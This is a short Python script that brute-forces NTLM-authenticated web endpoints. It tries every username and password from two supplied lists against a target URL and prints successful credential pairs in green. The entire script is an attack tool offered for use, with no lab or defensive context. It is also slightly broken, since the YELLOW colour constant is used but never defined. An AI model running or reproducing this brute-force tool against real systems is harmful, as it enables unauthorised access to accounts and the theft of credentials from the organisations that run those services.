import sys

import requests
from requests_ntlm import HttpNtlmAuth

# ANSI escape code for green text
GREEN = "\033[92m"

# ANSI escape code for red text
RED = "\033[91m"

# ANSI escape code for resetting the text color
RESET = "\033[0m"

invalid_codes = [401, 403, 404]
possible_codes = [301, 302]

target_url = sys.argv[1]
with open(sys.argv[2]) as f:
    usernames = f.read().split("\n")
with open(sys.argv[3]) as f:
    passwords = f.read().split("\n")

print("Starting the brute force...")

for username in usernames:
    for password in passwords:
        r = requests.get(target_url, auth=HttpNtlmAuth(username, password))
        if r.status_code == 200:
            print(f"{GREEN}SUCCESS! {username}:{password} {r.status_code}{RESET}")
        elif r.status_code in invalid_codes:
            print(f"{RED}FAILURE! {username}:{password} {r.status_code}{RESET}")
        elif r.status_code in possible_codes:
            print(f"{YELLOW}30X RETURNED, Verify Manually! {username}:{password} {r.status_code}{RESET}")

print('Done!')
